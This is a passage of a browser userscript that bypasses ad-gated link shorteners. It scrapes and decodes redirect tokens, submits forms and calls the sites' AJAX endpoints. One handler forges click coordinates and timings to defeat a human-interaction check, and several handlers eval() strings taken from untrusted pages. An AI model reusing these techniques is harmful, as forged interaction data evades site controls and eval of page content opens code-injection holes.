      var m = $.searchScripts(PATTERN);
      if (m) {
        resolve(m);
        return;
      }
      var observer = new MutationObserver(function (mutations) {
        mutations.forEach(function (mutation) {
          mutation.addedNodes.forEach(function (node) {
            if (node.localName === 'script') {
              var m = node.textContent.match(PATTERN);
              if (m) {
                resolve(m);
                observer.disconnect();
              }
            }
          });
        });
      });
      observer.observe(document.body, {
        childList: true,
      });
    }).then(function (m) {
      return eval('(' + m[0] + ')');
    });
  }
  function tryLink (args) {
    var url = window.location.pathname + '/skip_timer';
    var i = setInterval(function () {
      $.post(url, args).then(function (text) {
        var jj = _.parseJSON(text);
        if (!jj.errors && jj.messages) {
          clearInterval(i);
          $.openLink(jj.messages.url);
        }
      });
    }, 1000);
  }
})();
(function () {
  'use strict';
  function getTokenFromRocketScript () {
    var a = $.searchScripts(/var eu = '(?!false)(.*)'/);
    return a ? a[1] : null;
  }
  $.register({
    rule: {
      host: /^adf\.ly$/,
      path: /^\/redirecting\/(.+)$/,
    },
    start: function (m) {
      var url = atob(m.path[1]);
      $.openLink(url);
    },
  });
  $.register({
    rule: {
      path: /\/locked$/,
      query: /url=([^&]+)/,
    },
    start: function (m) {
      $.resetCookies();
      var url = decodeURIComponent(m.query[1]);
      if (url.match(/^http/)) {
        $.openLink(url);
      } else {
        $.openLink('/' + url);
      }
    },
  });
  $.register({
    rule: function () {
      var h = $.$('html[id="main_html"]');
      if (h) {
        return true;
      } else {
        return null;
      }
    },
    start: function () {
      $.window.document.write = _.nop;
      $.window.btoa = _.nop;
      waitToken().then(function (token) {
        var url = decodeToken(token);
        $.openLink(url);
      }).catch(function (e) {
        _.warn(e);
      });
    },
    ready: function () {
      var h = $.$('#main_html'), b = $.$('#home');
      if (!h || !b || h.nodeName !== 'HTML' || b.nodeName !== 'BODY') {
        return;
      }
      $.removeNodes('iframe');
      $.window.cookieCheck = _.nop;
      h = getTokenFromRocketScript();
      if (!h) {
        h = $('#adfly_bar');
        $.window.close_bar();
        return;
      }
      h = decodeToken(h);
      $.openLink(h);
    },
  });
  function waitToken () {
    return _.D(function (resolve) {
      var o = new MutationObserver(function (mutations) {
        mutations.forEach(function (mutation) {
          _.C(mutation.addedNodes).each(function (node) {
            if (node.localName === 'script') {
              var m = node.textContent.match(/var ysmm = '([^']+)'/);
              if (m) {
                o.disconnect();
                resolve(m[1]);
              }
            }
          });
        });
      });
      o.observe(document.head, {
        childList: true,
      });
    });
  }
  function decodeToken (token) {
    var a = token.indexOf('!HiTommy');
    if (a >= 0) {
      token = token.substring(0, a);
    }
    a = '';
    var b = '';
    for (var i = 0; i < token.length; ++i) {
      if (i % 2 === 0) {
        a = a + token.charAt(i);
      } else {
        b = token.charAt(i) + b;
      }
    }
    token = atob(a + b);
    token = token.substr(2);
    if (location.hash) {
      token += location.hash;
    }
    return token;
  }
})();
$.register({
  rule: {
    host: /^(www\.)?adfe\.es$/,
    path: /^\/\w+$/,
  },
  ready: function () {
    'use strict';
    var f = $('#frmvideo');
    if (!f.STEP4) {
      return;
    }
    f.submit();
  },
});
$.register({
  rule: 'http://adfoc.us/*',
  ready: function () {
    'use strict';
    var root = document.body;
    var observer = new MutationObserver(function (mutations) {
      var o = $.$('#showSkip');
      if (o) {
        observer.disconnect();
        o = o.querySelector('a');
        $.openLink(o.href);
      }
    });
    observer.observe(root, {
      childList: true,
      subtree: true,
    });
  },
});
$.register({
  rule: {
    host: /^(www\.)?adjet\.biz$/,
  },
  ready: function () {
    'use strict';
    var m = $.searchScripts(/href=(\S+)/);
    if (!m) {
      throw new _.AdsBypasserError('site changed');
    }
    $.openLink(m[1]);
  },
});
(function () {
  'use strict';
  $.register({
    rule: {
      host: [
        /^adlink\.guru$/,
        /^cypt\.ga$/,
        /^(filesbucks|tmearn|cut-urls)\.com$/,
        /^elink\.link$/,
        /^(payurl|urlst)\.me$/,
        /^url\.ht$/,
        /^urle\.co$/,
        /^(hashe|trlink|adshort)\.in$/,
        /^www\.worldhack\.net$/,
        /^123link\.top$/,
        /^pir\.im$/,
        /^bol\.tl$/,
        /^(tl|adfly)\.tc$/,
        /^(adfu|linkhits)\.us$/,
        /^short\.pastewma\.com$/,
        /^linkfly\.gaosmedia\.com$/,
      ],
    },
    ready: function () {
      $.removeNodes('iframe', '.BJPPopAdsOverlay');
      firstStage().then(function (page) {
        return secondStage(page);
      }).then(function (url) {
        $.nuke(url);
        $.openLink(url);
      }).catch(function (e) {
        _.warn(e);
      });
    },
  });
  function firstStage () {
    return _.D(function (resolve, reject) {
      var f = $.$('#link-view');
      if (!f) {
        resolve(document);
        return;
      }
      var args = extractArgument(f);
      var url = f.getAttribute('action');
      var p = $.post(url, args).then(function (data) {
        return $.toDOM(data);
      });
      resolve(p);
    });
  }
  function secondStage (page) {
    var f = $('#go-link', page);
    var args = extractArgument(f);
    var url = f.getAttribute('action');
    return $.post(url, args).then(function (data) {
      data = JSON.parse(data);
      if (data && data.url) {
        return data.url;
      }
      throw new _.AdsBypasserError('wrong data');
    });
  }
  function extractArgument (form) {
    var args = {};
    $.$$('input', form).each(function (v) {
      args[v.name] = v.value;
    });
    return args;
  }
})();
$.register({
  rule: {
    host: /^adlock\.org$/,
  },
  ready: function () {
    'use strict';
    var a = $.$('#xre a.xxr, #downloadButton1');
    if (a) {
      $.openLink(a.href);
      return;
    }
    a = $.window.fileLocation;
    if (a) {
      $.openLink(a);
    }
  },
});
$.register({
  rule: {
    host: /^(www\.)?adlot\.us$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var script = $.searchScripts('form');
    var p = /name='([^']+)' value='([^']+)'/g;
    var opt = {
      image: ' ',
    };
    var tmp = null;
    while (tmp = p.exec(script)) {
      opt[tmp[1]] = tmp[2];
    }
    $.openLink('', {
      path: opt,
    });
  },
});
$.register({
  rule: {
    host: /^admy\.link$/,
  },
  ready: function () {
    'use strict';
    var f = $('form.edit_link');
    f.submit();
  },
});
$.register({
  rule: {
    host: /^(www\.)?ah-informatique\.com$/,
    path: /^\/ZipUrl/,
  },
  ready: function () {
    'use strict';
    var a = $('#zip3 a');
    $.openLink(a.href);
  },
});
(function () {
  'use strict';
  function decodeScript (encoded) {
    var a = encoded.match(/^\s*;eval\((.+)\);\s*$/);
    a = a[1];
    var b = a.match(/^(.+)\('([^']+)','([^']+)','([^']+)','([^']+)'\)$/);
    var c = eval('(' + b[1] + ')');
    return c(b[2], b[3], b[4], b[5]);
  }
  $.register({
    rule: {
      host: /^ah\.pe$/,
    },
    ready: function () {
      var script = $.searchScripts('eval');
      script = decodeScript(script);
      script = decodeScript(script);
      script = decodeScript(script);
      var path = script.match(/([^;= ]+)=([^+ ;]+)\+"\."\+([^+ ]+)\+"\."\+([^; ]+);/);
      if (!path) {
        throw new _.AdsBypasserError('script changed');
      }
      if (typeof $.window[path[2]] === 'undefined') {
        _.info('recaptcha');
        return;
      }
      path = _.T('{0}.{1}.{2}')($.window[path[2]], $.window[path[3]], $.window[path[4]]);
      $.openLink(path);
    },
  });
})();
$.register({
  rule: {
    host: /^aka\.gr$/
  },
  ready: function () {
    'use strict';
    var l = $('iframe#yourls-frame');
    $.openLink(l.src);
  },
});
$.register({
  rule: {
    host: [
      /^al\.ly$/,
      /^ally\.sh$/,
    ],
  },
  ready: function () {
    'use strict';
    var i = $.$('body > section > iframe');
    if (i) {
      i.src = 'about:blank';
      _.wait(3000).then(function () {
        var a = $('a.redirect');
        a.click();
      });
      return;
    }
    i = $.searchScripts(/"href","([^"]+)"\)\.remove/);
    if (!i) {
      _.warn('site changed');
      return;
    }
    i = i[1];
    $.openLink(i);
  },
});
$.register({
  rule: {
    host: [
      /^(www\.)?allkeyshop\.com$/,
      /^cshort\.org$/,
    ],
  },
  ready: function (m) {
    'use strict';
    var matches = $.searchScripts(/window\.location\.href = "([^"]+)"/);
    matches = matches[1];
    $.nuke(matches);
    $.openLink(matches);
  },
});
$.register({
  rule: {
    host: /^anonymbucks\.com$/,
  },
  ready: function () {
    'use strict';
    var a = $('#boton-continuar');
    a.click();
  },
});
(function () {
  'use strict';
  var ajaxPattern = /\$.post\('([^']*)'[^{]+(\{\s*opt:\s*'make_log'[^}]+\}\s*\}),/i;
  $.register({
    rule: {
      host: [
        /^bc\.vc$/,
        /^linc\.ml$/,
      ],
      path: /^.+(https?:\/\/.+)$/,
    },
    start: function (m) {
      $.openLink(m.path[1] + document.location.search + document.location.hash);
    },
  });
  function decompress (script, unzip) {
    if (!unzip) {
      return script;
    }
    var matches = script.match(/eval(.*)/);
    if (!matches) {
      throw new _.AdsBypasserError('no script matches /eval(.*)/');
    }
    matches = matches[1];
    script = eval(matches);
    return script;
  }
  function searchScript (unzip) {
    var content = $.searchScripts('make_log');
    if (content) {
      return {
        direct: false,
        script: decompress(content, unzip),
      };
    }
    content = $.searchScripts('click_log');
    if (content) {
      return {
        direct: true,
        script: decompress(content, unzip),
      };
    }
    throw new _.AdsBypasserError('script changed');
  }
  function knockServer (script, dirtyFix) {
    var matches = script.match(ajaxPattern);
    if (!matches) {
      throw new _.AdsBypasserError('(in knock server) no script matches $.post');
    }
    var make_url = matches[1];
    var make_opts = eval('(' + matches[2] + ')');
    var i = setInterval(function () {
      $.post(make_url, make_opts).then(function (text) {
        if (dirtyFix) {
          text = text.match(/\{.+\}/)[0];
        }
        var jj = _.parseJSON(text);
        if (jj.message) {
          clearInterval(i);
          $.openLink(jj.message.url);
        }
      });
    }, 1000);
  }
  $.register({
    rule: {
      host: /^bc\.vc$/,
      path: /^\/.+/,
    },
    ready: function () {
      $.removeNodes('iframe');
      var token = findAJAXToken();
      var time = fakeAJAXToken();
      var url = _.T('/fly/ajax.php?wds={0}&time={1}');
      url = url(token.wds, time);
      _.wait(5000).then(function () {
        return $.post(url, {
          xdf: {
            afg: $.window.tZ,
            bfg: $.window.cW,
            cfg: $.window.cH,
            jki: token.jki,
            dfg: $.window.sW,
            efg: $.window.sH,
          },
          ojk: token.ojk,
        });
      }).then(function (rv) {
        rv = JSON.parse(rv);
        if (rv.error) {
          throw new _.AdsBypasserError('auth error');
        }
        $.openLink(rv.message.url);
      }).catch(function (e) {
        _.warn('ajax error', e);
      });
    },
  });
  function run (dirtyFix) {
    $.removeNodes('iframe');
    var result = searchScript(true);
    if (!result.direct) {
      knockServer(result.script,dirtyFix);
    } else {
      result = result.script.match(/top\.location\.href='([^']+)'/);
      if (!result) {
        throw new _.AdsBypasserError('script changed');
      }
      result = result[1];
      $.openLink(result);
    }
  }
  $.register({
    rule: {
      host: /^adcrun\.ch$/,
      path: /^\/\w+$/,
    },
    ready: function () {
      $.removeNodes('.user_content');
      var rSurveyLink = /http\.open\("GET", "api_ajax\.php\?sid=\d*&ip=[^&]*&longurl=([^"]+)" \+ first_time, (?:true|false)\);/;
      var l = $.searchScripts(rSurveyLink);
      if (l) {
        $.openLink(l[1]);
        return;
      }
      run(true);
    },
  });
  $.register({
    rule: {
      host: [
        /^(1tk|hit|adbla|tl7|mylink)\.us$/,
        /^gx\.si$/,
        /^adwat\.ch$/,
        /^(fly2url|urlwiz|xafox)\.com$/,
        /^(zpoz|ultry)\.net$/,
        /^(wwy|myam)\.me$/,
        /^(ssl|srk)\.gs$/,
        /^shortit\.in$/,
        /^www\.adjet\.eu$/,
        /^cun\.bz$/,
        /^miniurl\.tk$/,
        /^vizzy\.es$/,
        /^kazan\.vc$/,
        /^linkcash\.ml$/,
      ],
      path: /^\/.+/,
    },
    ready: run,
  });
  $.register({
    rule: {
      host: [
        /^adtr\.im$/,
        /^ysear\.ch$/,
        /^xip\.ir$/,
      ],
      path: /^\/.+/,
    },
    ready: function () {
      var a = $.$('div.fly_head a.close');
      var f = $.$('iframe.fly_frame');
      if (a && f) {
        $.openLink(f.src);
      } else {
        run();
      }
    },
  });
  $.register({
    rule: {
      host: /^ad5\.eu$/,
      path: /^\/[^.]+$/,
    },
    ready: function() {
      $.removeNodes('iframe');
      var s = searchScript(true);
      var m = s.script.match(/(<form name="form1"method="post".*(?!<\\form>)<\/form>)/);
      if (!m) {return;}
      m = m[1];
      var tz = -(new Date().getTimezoneOffset()/60);
      m = m.replace("'+timezone+'",tz);
      var d = document.createElement('div');
      d.setAttribute('id','AdsBypasserFTW');
      d.setAttribute('style', 'display:none;');
      d.innerHTML = m;
      document.body.appendChild(d);
      $('#AdsBypasserFTW > form[name=form1]').submit();
    },
  });
  $.register({
    rule: {
      host: /^tr5\.in$/,
      path: /^\/.+/,
    },
    ready: function () {
      run(true);
    },
  });
  function findAJAXToken () {
    var rv = $.searchScripts('/fly/ajax.php');
    if (!rv) {
      throw new _.AdsBypasserError('script changed');
    }
    var wds = rv.match(/\?wds=([^&]+)/);
    if (!wds) {
      throw new _.AdsBypasserError('script changed');
    }
    wds = wds[1];
    var jki = rv.match(/jki:\s*'([^']+)'/);
    if (!jki) {
      throw new _.AdsBypasserError('script changed');
    }
    jki = jki[1];
    var ojk = rv.match(/ojk:\s*'([^']+)'/);
    if (!ojk) {
      throw new _.AdsBypasserError('script changed');
    }
    ojk = ojk[1];
    return {
      wds: wds,
      jki: jki,
      ojk: ojk,
    };
  }
  function fakeAJAXToken () {
    var skipAd = $('div.fly_head span#redirectin').parentElement;
    var margin = 6;
    var fakePageX = skipAd.offsetLeft + margin + 50 + (Math.random() * 10);
    var fakePageY = skipAd.offsetTop + margin + 15 + (Math.random() * 1);
    var po = fakePageX + ',' + fakePageY;
    var posX = jQueryOffset(skipAd).left + margin;
    var posY = jQueryOffset(skipAd).top + margin;
    var pos = (fakePageX - posX) + ',' + (fakePageY - posY);
    var tsta_ = Math.floor((5 + Math.random()) * 1000);
    var time = po + ':' + pos + ':' + tsta_;
    return time;
  }
  function jQueryOffset (element) {
    var r = element.getBoundingClientRect();
    return {
      top: r.top + document.body.scrollTop,
      left: r.left + document.body.scrollLeft,
    };
  }
})();
$.register({
  rule: {
    host: /^(www\.)?biglistofwebsites\.com$/,
    path: /^\/go\/(\w+\.\w+)$/
  },
  start: function (m) {
    'use strict';
    $.openLink('http://' + m.path[1]);
  },
});
$.register({
  rule: 'http://www.bild.me/bild.php?file=*',
  ready: function () {
    'use strict';
    var i = $('#Bild');
    $.openLink(i.src);
  },
});
$.register({
  rule: 'http://bildr.no/view/*',
  ready: function () {
    'use strict';
    var i = $('img.bilde');
    $.openLink(i.src);
  },
});
$.register({
  rule: {
    host: /^(www\.)?([a-zA-Z0-9]+\.)?binbox\.io$/,
    path: /\/o\/([a-zA-Z0-9]+)/,
  },
  start: function (m) {
    'use strict';
    var direct_link = window.atob(m.path[1]);
    $.openLink(direct_link);
  },
});
$.register({
  rule: {
    host: /^(www\.)?boxcash\.net$/,
    path: /^\/[\w~]+$/,
  },
  ready: function () {
    'use strict';
    var m = $.searchScripts(/\'\/ajax_link\.php\',\s*\{key:\s*'(\w+)',\s*url:\s*'(\d+)',\s*t:\s*'(\d+)',\s*r:\s*'(\w*)'\}/);
    if (!m) {
      return;
    }
    $.post('/ajax_link.php', {
      key: m[1],
      url: m[2],
      t: m[3],
      r: m[4],
    }).then(function (response) {
      var l = response.match(/window(?:.top.window)\.location="([^"]+)"/);
      $.openLink(l[1]);
    });
  },
});
$.register({
  rule: {
    host: /^(www\.)?boxcash\.net$/,
    path: /^\/redirect\.html$/,
    query: /url=(.+)$/,
  },
  start: function (m) {
    'use strict';
    var l = decodeURIComponent(m.query[1]);
    $.openLink(l);
  },
});
$.register({
  rule: {
    host: /^(www\.)?(buz|vzt)url\.com$/,
  },
  ready: function () {
    'use strict';
    var frame = $('frame[scrolling=yes]');
    $.openLink(frame.src);
  },
});
$.register({
  rule: {
    host: /^(cf|ex|xt)\d\.(me|co)$/,
  },
  ready: function (m) {
    'use strict';
    $.removeNodes('iframe');
    var a = $('#skip_button');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^catcut\.net$/,
  },
  ready: function () {
    'use strict';
    var a = $('#rbs');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^cf\.ly$/,
    path: /^\/[^\/]+$/,
  },
  start: function (m) {
    'use strict';
    $.removeNodes('iframe');
    $.openLink('/skip' + m.path[0]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?cli\.gs$/,
  },
  ready: function () {
    'use strict';
    var a = $('a.RedirectLink');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?clictune\.com$/,
    path: /^\/id=\d+/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var matches = $.searchScripts(/<a href="http:\/\/(?:www.)?clictune\.com\/redirect\.php\?url=([^&]+)&/);
    var url = decodeURIComponent(matches[1]);
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^clk\.im$/,
  },
  ready: function (m) {
    'use strict';
    $.removeNodes('iframe');
    var matches = $.searchScripts(/\$\("\.countdown"\)\.attr\("href","([^"]+)"\)/);
    $.openLink(matches[1]);
  },
});
$.register({
  rule: {
    host: /^cocoleech\.com$/,
  },
  ready: function () {
    'use strict';
    var a = $('#download');
    $.openLink(a.href);
  },
});
(function () {
  'use strict';
  function hostMapper (host) {
    switch (host) {
    case 'disingkat.in':
      return function () {
        var a = $('a.btn-block.redirect');
        return a.href;
      };
    case 'link.animagz.org':
      return function () {
        var a = $('a.redirect');
        a = a.onclick.toString();
        a = a.match(/window\.open \('([^']+)'\)/);
        return a[1];
      };
    case 'coeg.in':
    case 'www.telondasmu.com':
      return function () {
        var a = $('.download-link a');
        return a.href;
      };
    case 'gunting.in':
      return function () {
        var a = $('div.col-sm-6:nth-child(1) > center:nth-child(1) > a:nth-child(1)');
        return a.href;
      };
    default:
      return null;
    }
  }
  $.register({
    rule: {
      host: [
        /^link\.animagz\.org$/,
        /^(coeg|disingkat|gunting)\.in$/,
        /^www\.telondasmu\.com$/,
      ],
      path: /^\/\w+$/,
    },
    ready: function (m) {
      var mapper = hostMapper(m.host[0]);
      var b64 = mapper().match(/\?r=(\w+={0,2}?)/);
      $.openLink(atob(b64[1]));
    },
  });
  $.register({
    rule: {
      host: /^sipkur\.(net|us)$/,
      path: [
        /^\/\w+$/,
        /^\/menujulink\//,
      ],
    },
    ready: function () {
      var d = $('#testapk > div');
      d = d.onclick.toString();
      d = d.match(/window\.open\('([^']+)'/);
      $.openLink(d[1]);
    },
  });
})();
$.register({
  rule: {
    host: /^coinlink\.co$/,
    path: /^\/i\//,
  },
  ready: function (m) {
    'use strict';
    var a = $('a#btn-main, a.btn.btn-block.btn-warning, a.btn.btn-block.btn-success');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(?:(\w+)\.)?(coinurl\.com|cur\.lv)$/,
    path: /^\/([-\w]+)$/
  },
  ready: function (m) {
    'use strict';
    $.removeNodes('iframe');
    var host = 'http://cur.lv/redirect_curlv.php';
    var param = m.host[1] === undefined ? {
      code: m.path[1],
    } : {
      zone: m.host[1],
      name: m.path[1],
    };
    $.get(host, param).then(function(mainFrameContent) {
      try {
        var docMainFrame = $.toDOM(mainFrameContent);
      } catch (e) {
        throw new _.AdsBypasserError('main frame changed');
      }
      var rExtractLink = /onclick="open_url\('([^']+)',\s*'go'\)/;
      var innerFrames = $.$$('iframe', docMainFrame).each(function (currFrame) {
        var currFrameAddr = currFrame.getAttribute('src');
        $.get(currFrameAddr).then(function(currFrameContent) {
          var aRealLink = rExtractLink.exec(currFrameContent);
          if (aRealLink === undefined || aRealLink[1] === undefined) {
            return;
          }
          var realLink = aRealLink[1];
          $.openLink(realLink);
        });
      });
    });
  },
});
$.register({
  rule: {
    host: /^comyonet\.com$/,
  },
  ready: function () {
    'use strict';
    var input = $('input[name="enter"]');
    input.click();
  },
});
$.register({
  rule: {
    host: /^(www\.)?cvc\.la$/,
    path: /^\/\w+$/,
  },
  start: function () {
    'use strict';
    $.post(document.location.href, {
      hidden: 24, 
      image: ' ',
    }).then(function (text) {
      var matches = text.match(/window\.location\.replace\('([^']+)'\);/);
      $.openLink(matches[1]);
    });
  },
});
$.register({
  rule: {
    host: /^(www\.)?dapat\.in$/,
  },
  ready: function () {
    'use strict';
    var f = $('iframe[name=pagetext]');
    $.openLink(f.src);
  },
});
$.register({
  rule: {
    host: /^(www\.)?dd\.ma$/,
  },
  ready: function (m) {
    'use strict';
    var i = $.$('#mainframe');
    if (i) {
      $.openLink(i.src);
      return;
    }
    var a = $('#btn_open a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?dereferer\.website$/,
    query: /^\?(.+)/,
  },
  start: function (m) {
    'use strict';
    $.openLink(m.query[1]);
  },
});
$.register({
  rule: {
    host: /^dikit\.in$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var a = $('.disclaimer a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^durl\.me$/,
  },
  ready: function () {
    'use strict';
    var a = $('a[class="proceedBtn"]');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: [
      /^easyurl\.net$/,
      /^(atu|clickthru|redirects|readthis)\.ca$/,
      /^goshrink\.com$/,
    ],
  },
  ready: function () {
    'use strict';
    var f = $('frame[name=main]');
    $.openLink(f.src);
  },
});
$.register({
  rule: {
    host: /^elde\.me$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe:not([name=undefined])');
    var a = $('#modal-alert');
    a.style.display = 'block';
    a.style.top = 0;
    a.style.left = 0;
  },
});
$.register({
  rule: {
    host: [
    	/^ethi\.in$/,
    	/^st\.wardhanime\.net$/,
    ],
    path: /^\/i\/\d+$/,
  },
  ready: function () {
    'use strict';
    var a = $('#wrapper > [class^="tombo"] > a[target="_blank"]');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?filoops\.info$/,
  },
  ready: function () {
    'use strict';
    var a = $('#text > center a, #text > div[align=center] a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^fit\.sh$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('.container-body');
    var m = $.searchScripts(/token="([^"]+)"/);
    if (!m) {
      throw new _.AdsBypasserError('site changed');
    }
    m = m[1];
    var interLink = '/go/' + m + '?fa=15466&a=' + window.location.hash.substr(1);
    setTimeout(function () {
      $.openLink(interLink);
    }, 6000);
  },
});
$.register({
  rule: {
    host: /^(www\.)?fiuxy\.co$/,
    path: /^\/links?\/$/,
  },
  ready: function () {
    $.openLink($('a.btn.a').href);
  }
});
(function () {
  'use strict';
  $.register({
    rule: {
      host: /^(www\.)?fundurl\.com$/,
      query: /i=([^&]+)/,
    },
    start: function (m) {
      $.openLink(m.query[1]);
    },
  });
  $.register({
    rule: {
      host: /^(www\.)?fundurl\.com$/,
      path: /^\/(go-\w+|load\.php)$/,
    },
    ready: function () {
      var f = $('iframe[name=fpage3]');
      $.openLink(f.src);
    },
  });
})();
(function () {
  var hosts = /^gca\.sh|repla\.cr$/;
  $.register({
    rule: {
      host: hosts,
      path: /^\/adv\/\w+\/(.*)$/,
      query: /^(.*)$/,
      hash: /^(.*)$/,
    },
    start: function (m) {
      'use strict';
      var l = m.path[1] + m.query[1] + m.hash[1];
      $.openLink(l);
    },
  });
  $.register({
    rule: {
      host: hosts,
    },
    ready: function () {
      'use strict';
      $.removeNodes('iframe');
      var jQuery = $.window.$;
      setTimeout(function () {
        jQuery("#captcha-dialog").dialog("open");
      }, 1000);
    },
  });
})();
$.register({
  rule: {
    host: /^gkurl\.us$/,
  },
  ready: function () {
    'use strict';
    var iframe = $('#gkurl-frame');
    $.openLink(iframe.src);
  },
});
$.register({
  rule: {
    host: /^u\.go2\.me$/,
  },
  ready: function () {
    'use strict';
    var iframe = $('iframe');
    $.openLink(iframe.src);
  },
});
$.register({
  rule: {
    host: /^goto\.loncat\.in$/,
    query: /open=(.+)/,
  },
  start: function (m) {
    'use strict';
    var url = atob(atob(m.query[1]));
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: [
      /^gsurl\.(me|in)$/,
      /^g5u\.pw$/,
    ],
  },
  ready: function () {
    'use strict';
    $.removeNodes('#container');
    var a = $('#link');
    _.wait(5000).then(function () {
      $.openLink(a.href);
    });
  },
});
$.register({
  rule: {
    host: /^hotshorturl\.com$/,
  },
  ready: function () {
    'use strict';
    var frame = $('frame[scrolling=yes]');
    $.openLink(frame.src);
  },
});
$.register({
  rule: {
    host: /^(www\.)?(ilix\.in|priva\.us)$/,
    path: /\/(\w+)/,
  },
  ready: function (m) {
    'use strict';
    var realHost = 'ilix.in';
    if (m.host[2] !== realHost) {
      var realURL = location.href.replace(m.host[2], realHost);
      $.openLink(realURL);
      return;
    }
    var f = $.$('iframe[name=ifram]');
    if (f) {
      $.openLink(f.src);
      return;
    }
    if (!$.$('img#captcha')) {
      $('form[name=frm]').submit();
    }
  },
});
$.register({
  rule: {
    host: /^ilovebanten\.com$/,
  },
  ready: function () {
    'use strict';
    var p = $('.notblocked');
    $.openLink(p.textContent);
  },
});
$.register({
  rule: {
    host: /^indexmovie\.me$/,
    path: /^\/([^\/]+)$/,
  },
  start: function (m) {
    'use strict';
    $.openLink('/get/' + m.path[1]);
  },
});
$.register({
  rule: {
    host: /^itw\.me$/,
    path: /^\/r\//,
  },
  ready: function () {
    'use strict';
    var f = $('.go-form');
    f.submit();
  },
});
$.register({
  rule: {
    host: /^ity\.im$/,
  },
  ready: function () {
    'use strict';
    var f = $.$('#main');
    if (f) {
      $.openLink(f.src);
      return;
    }
    f = $.$$('frame').find(function (frame) {
      if (frame.src.indexOf('interheader.php') < 0) {
        return _.none;
      }
      return frame.src;
    });
    if (f) {
      $.openLink(f.payload);
      return;
    }
    f = $.searchScripts(/krypted=([^&]+)/);
    if (!f) {
      throw new _.AdsBypasserError('site changed');
    }
    f = f[1];
    var data = $.window.des('ksnslmtmk0v4Pdviusajqu', $.window.hexToString(f), 0, 0);
    if (data) {
      $.openLink('http://ity.im/1104_21_50846_' + data);
    }
  },
});
$.register({
  rule: {
    host: /^(www\.)?kingofshrink\.com$/,
  },
  ready: function () {
    'use strict';
    var l = $('#textresult > a');
    $.openLink(l.href);
  },
});
$.register({
  rule: {
    host: /^st\.kurogaze\.net$/,
    query: /r=(.+)/,
  },
  start: function (m) {
    'use strict';
    var r = atob(m.query[1]);
    $.openLink(r);
  },
});
$.register({
  rule: {
    host: /^st\.kurogaze\.net$/,
  },
  ready: function () {
    'use strict';
    var a = $('a.redirect');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?leechbd\.tk$/,
    path: /^\/Shortener\/(\w+)$/,
  },
  start: function (m) {
    'use strict';
    $.get('/Shortener/API/read/get', {id: m.path[1], type: 'json'}).then(function (text) {
      var r = _.parseJSON(text);
      if (r.success == true && r.data.full) {
        $.openLink(r.data.full);
      } else {
        _.warn('API Error ' + r.error.code + ' : ' + r.error.msg);
      }
    });
  },
});
$.register({
  rule: 'http://www.lienscash.com/l/*',
  ready: function () {
    'use strict';
    var a = $('#redir_btn');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?\w+\.link-protector\.com$/,
  },
  ready: function (m) {
    'use strict';
    var f = $('form[style="font-weight:normal;font-size:12;font-family:Verdana;"]');
    $.openLink(f.action);
  },
});
$.register({
  rule: {
    host: /^(www\.)?link\.im$/,
    path: /^\/\w+$/,
  },
  start: function () {
    'use strict';
    $.post(document.location.href, {
      image: 'Continue',
    }).then(function (text) {
      var m = text.match(/window\.location\.replace\('([^']+)'\)/);
      $.openLink(m[1]);
    });
  },
});
$.register({
  rule: {
    host: /^link\.tl$/,
    path: /^\/fly\/site\.php$/,
    query: /^\?to=(.+)$/,
  },
  ready: function () {
    'use strict';
    var a = $('.skip > .btn');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^link\.tl$/,
    path: /[^^](https?:\/\/.+)$/,
  },
  start: function (m) {
    'use strict';
    $.openLink(m.path[1]);
  },
});
$.register({
  rule: {
    host: /^link\.tl$/,
    path: /^\/(.+)$/,
  },
  start: function (m) {
    'use strict';
    $.openLink('/fly/site.php?to=' + m.path[1]);
  },
});
$.register({
  rule: {
    host: /\.link2dollar\.com$/,
    path: /^\/\d+$/,
  },
  ready: function () {
    'use strict';
    var m = $.searchScripts(/var rlink = '([^']+)';/);
    if (!m) {
      throw new _.AdsBypasserError('site changed');
    }
    m = m[1];
    $.openLink(m);
  },
});
$.register({
  rule: {
    host: /^link2you\.ru$/,
    path: /^\/\d+\/(.+)$/,
  },
  start: function (m) {
    'use strict';
    var url = m.path[1];
    if (!url.match(/^https?:\/\//)) {
      url = '//' + url;
    }
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^link(4ad|ajc)\.com$/,
    path: /^\/(.+)$/,
  },
  ready: function (m) {
    'use strict';
    var d = $('div[id^=module_]');
    d = d.id.match(/module_(\d+)/);
    d = d[1];
    $.post('form.php?block_id=' + d, {
      cmd: 'get_source',
      act: 'waiting',
      id: m.path[1],
    }).then(function (url) {
      $.openLink(url);
    }).catch(function (e) {
      _.warn(e);
    });
  },
});
(function () {
  'use strict';
  function sendRequest (opts) {
    return $.post('/ajax/r.php', opts).then(function (data) {
      if (data.length <= 1) {
        return sendRequest(opts);
      }
      var a = $.toDOM(data);
      a = $('a', a);
      return a.href;
    });
  }
  $.register({
    rule: {
      host: /^link5s\.com$/,
      path: /^\/([^\/]+)$/,
    },
    ready: function (m) {
      $.window.$ = null;
      var i = $('#iframeID');
      var opts = {
        page: m.path[1],
        advID: i.dataset.cmp,
        u: i.dataset.u,
      };
      $.removeNodes('iframe');
      sendRequest(opts).then(function (url) {
        $.openLink(url);
      });
    },
  });
})();
(function() {
  function ConvertFromHex (str) {
    var result = [];
    while (str.length >= 2) {
      result.push(String.fromCharCode(parseInt(str.substring(0, 2), 16)));
      str = str.substring(2, str.length);
    }
    return result.join("");
